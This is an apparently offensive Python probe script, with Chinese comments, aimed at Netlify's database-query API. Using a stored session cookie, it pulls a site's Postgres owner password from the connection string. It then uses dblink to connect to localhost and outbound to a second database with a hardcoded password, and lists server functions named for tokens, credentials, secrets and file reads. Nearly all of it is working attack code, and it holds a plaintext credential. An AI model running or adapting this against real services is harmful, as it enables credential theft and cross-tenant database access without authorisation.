# -*- coding: utf-8 -*-
"""技术层测试 4:
1. GET /database 拿 A owner 连接串密码
2. dblink_connect localhost 基线(正确密码)
3. dblink 出站 B(带 B 密码,DNS/网络判定)
4. neon/neon_utils 函数完整名单
5. PG server version"""
import http.client, ssl, gzip, brotli, json, sys, re
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'
PWD_B = 'npg_TWUSd2Mavu7G'


def api(method, path):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=30)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'gzip',
         'Accept': 'application/json', 'Cookie': COOKIE_A}
    conn.request(method, path, headers=h)
    r = conn.getresponse()
    raw = r.read()
    if r.getheader('Content-Encoding') == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw.decode('utf-8', 'ignore')
    conn.close()
    return st, out


def q(sql, timeout=90):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    body = {'siteId': SITE_A, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:2500].decode('utf-8', 'ignore')
    conn.close()
    return st, out


def tx(qs, timeout=90):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    body = {'siteId': SITE_A, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:1500].decode('utf-8', 'ignore')
    conn.close()
    return st, out


def qq(s):
    return "'" + s.replace("'", "''") + "'"


print('== 1. A 连接串 ==')
st, out = api('GET', '/api/v1/sites/%s/database' % SITE_A)
print('[%d] %s' % (st, out[:800]))
m = re.search(r'postgres://[^"\s]+', out)
pwd_a = None
if m:
    u = m.group(0)
    pwd_a = u.split('@')[0].rsplit(':', 1)[1]
    print('A owner pwd =', pwd_a)

print()
print('== 2/3. dblink 基线+出站 ==')
if pwd_a:
    st, out = tx(["select dblink_connect('c1', %s)" % qq('host=127.0.0.1 port=5432 dbname=netlifydb user=netlifydb_owner password=' + pwd_a),
                  "select * from dblink('c1', %s) as t(u text)" % qq('select current_user::text'),
                  "select dblink_disconnect('c1')"], timeout=30)
    print('localhost base [%d] %s' % (st, out[:300]))
st, out = tx(["select dblink_connect('c2', %s)" % qq('host=ep-cold-unit-ae9s4l3i.c-2.us-east-2.db.netlify.com port=5432 dbname=netlifydb user=netlifydb_owner password=' + PWD_B),
              "select * from dblink('c2', %s) as t(u text)" % qq('select current_user::text'),
              "select dblink_disconnect('c2')"], timeout=30)
print('outbound B     [%d] %s' % (st, out[:300]))

print()
print('== 4. neon 函数名单 ==')
st, out = q("select n.nspname||'.'||p.proname||'('||pg_get_function_identity_arguments(p.oid)||')' from pg_proc p "
            "join pg_namespace n on p.pronamespace=n.oid where n.nspname='public' and "
            "(p.proname like 'neon%' or p.proname like '%lsn%' or p.proname like '%token%' or p.proname like '%credential%' "
            "or p.proname like '%password%' or p.proname like '%secret%' or p.proname like '%read%' or p.proname like '%file%')")
print('[%d] %s' % (st, out[:2500]))
print()
print('== 5. PG 版本 ==')
st, out = q("select version(), current_setting('server_version_num')")
print('[%d] %s' % (st, out[:400]))
